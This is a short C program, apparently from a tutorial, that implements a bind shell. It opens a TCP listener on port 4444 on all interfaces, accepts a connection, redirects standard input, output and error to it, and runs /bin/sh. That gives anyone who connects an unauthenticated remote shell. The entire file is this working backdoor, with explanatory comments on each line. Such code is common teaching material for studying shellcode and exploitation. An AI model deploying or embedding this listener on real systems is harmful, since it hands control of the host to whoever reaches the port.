#include <stdio.h> 
#include <sys/types.h>  
#include <sys/socket.h> 
#include <netinet/in.h> 

int host_sockid;    // socket file descriptor 
int client_sockid;  // client file descriptor 

struct sockaddr_in hostaddr;            // server aka listen address

int main() 
{ 
    // Create new TCP socket 
    host_sockid = socket(PF_INET, SOCK_STREAM, 0); 

    // Initialize sockaddr struct to bind socket using it 
    hostaddr.sin_family = AF_INET;                  // server socket type address family = internet protocol address
    hostaddr.sin_port = htons(4444);                // server port, converted to network byte order
    hostaddr.sin_addr.s_addr = htonl(INADDR_ANY);   // listen to any address, converted to network byte order

    // Bind socket to IP/Port in sockaddr struct 
    bind(host_sockid, (struct sockaddr*) &hostaddr, sizeof(hostaddr)); 

    // Listen for incoming connections 
    listen(host_sockid, 2); 

    // Accept incoming connection 
    client_sockid = accept(host_sockid, NULL, NULL); 

    // Duplicate file descriptors for STDIN, STDOUT and STDERR 
    dup2(client_sockid, 0); 
    dup2(client_sockid, 1); 
    dup2(client_sockid, 2); 

    // Execute /bin/sh 
    execve("/bin/sh", NULL, NULL); 
    close(host_sockid); 

    return 0; 
}
